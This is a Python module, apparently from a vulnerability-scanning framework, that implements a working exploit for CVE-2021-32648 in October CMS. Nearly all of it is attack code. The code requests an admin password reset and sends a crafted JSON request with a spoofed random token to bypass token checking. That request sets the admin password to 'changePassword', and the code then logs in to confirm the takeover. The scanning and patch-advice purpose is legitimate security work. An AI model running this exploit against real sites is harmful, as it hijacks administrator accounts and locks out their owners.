"""Agent Asteroid implementation for CVE-2021-32648"""

import logging
import random
import string
import re
from urllib3 import exceptions
from urllib3 import disable_warnings

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

disable_warnings(exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 90
RESET_PATH = "/backend/backend/auth/restore"
PASSWORD_PATH = "/backend/backend/auth/reset/1"
SIGNIN_PATH = "/backend/backend/auth/signin"
FAILED_LOGIN = "The details you entered did not match our records. Please double-check and try again."

VULNERABILITY_TITLE = "October CMS password recovery vulnerability: CVE-2021-32648"
VULNERABILITY_REFERENCE = "CVE-2021-32648"
VULNERABILITY_DESCRIPTION = (
    "octobercms in a CMS platform based on the Laravel PHP Framework."
    " In affected versions of the october/system package an attacker can request an account "
    "password reset and then gain access to the account using a specially crafted request."
    " The issue has been patched in Build 472 and v1.1.5."
)
RISK_RATING = "CRITICAL"
REFERENCES = {
    "PaloAlto": "https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/",
}
RECOMMENDATION = """
    Organizations running OctoberCMS prior to Build 472 and v1.1.5 are encouraged to update to the latest
    version. Additionally, in order for this vulnerability to be exploited, the web server 
    must be running PHP below 7.4. 
"""

logger = logging.getLogger(__name__)


@exploits_registry.register
class CVE202132648Exploit(definitions.Exploit):
    """October CMS Improper Authentication: CVE-2021-32648."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        recommendation=RECOMMENDATION,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            r = self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return r.status_code == 200 and "october_session" in r.headers.get(
            "Set-Cookie", ""
        )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        if (
            self._trigger_reset(target.origin) is True
            and self._set_password(target.origin) is True
            and self._login_attempt(target.origin) is True
        ):
            vulnerability = self.create_vulnerability(target)
            vulnerability.technical_detail = (
                f"{target.url} is vulnerable to CVE-2021-32648: the admin user's"
                f" password being changed to `ChangePassword`."
            )
            return [vulnerability]

        return []

    def _get_csrf(self, url: str) -> str | None:
        """Connect to Host and read the CSRF token so we can use it in POSTS"""
        csrf_pattern = b'<meta name="csrf-token" content="(.*?)">'
        try:
            csrf_request = self.session.get(f"{url}{RESET_PATH}")
        except requests_exceptions.RequestException:
            return None

        if csrf_request.status_code == 200:
            match = re.search(csrf_pattern, csrf_request.content)
            if match is not None:
                csrf_token = match.group(1)
                return csrf_token.decode()
        return None

    def _trigger_reset(self, url: str) -> bool:
        """Trigger a Password Reset Request for the admin account"""
        reset_url = f"{url}{RESET_PATH}"
        csrf_token = self._get_csrf(url)
        if csrf_token is not None:
            post_data = {"_token": csrf_token, "postback": 1, "login": "admin"}
            try:
                reset_request = self.session.post(
                    reset_url, data=post_data, timeout=DEFAULT_TIMEOUT
                )
            except requests_exceptions.RequestException:
                return False

            if reset_request.status_code == 200:
                return True
        return False

    def _login_attempt(self, url: str) -> bool:
        """checks if we can log in with the admin account."""
        login_url = f"{url}{SIGNIN_PATH}"
        csrf_token = self._get_csrf(url)
        if csrf_token is not None:
            post_data = {
                "_token": csrf_token,
                "postback": 1,
                "login": "admin",
                "password": "changePassword",
            }
            try:
                login_request = self.session.post(
                    login_url, data=post_data, timeout=DEFAULT_TIMEOUT
                )
            except requests_exceptions.RequestException:
                return False

            if (
                login_request.status_code == 200
                and FAILED_LOGIN not in login_request.text
            ):
                return True
        return False

    def _set_password(self, url: str) -> bool:
        """Send a request to set the admin password that will bypass the token checking"""
        # Generate a random string of len 42 to spoof a reset token
        chars = string.ascii_uppercase + string.digits + string.ascii_lowercase
        random_string = "".join(random.choice(chars) for _ in range(42))
        reset_url = f"{url}{PASSWORD_PATH}/{random_string}"
        csrf_token = self._get_csrf(url)
        if csrf_token is not None:
            post_data = {
                "_token": csrf_token,
                "postback": 1,
                "id": 1,
                "code": True,
                "password": "changePassword",
            }
            try:
                reset_request = self.session.post(
                    reset_url,
                    headers={"Content-Type": "application/json"},
                    json=post_data,
                    timeout=DEFAULT_TIMEOUT,
                )
            except requests_exceptions.RequestException:
                return False

            if reset_request.status_code == 200:
                return True
        return False
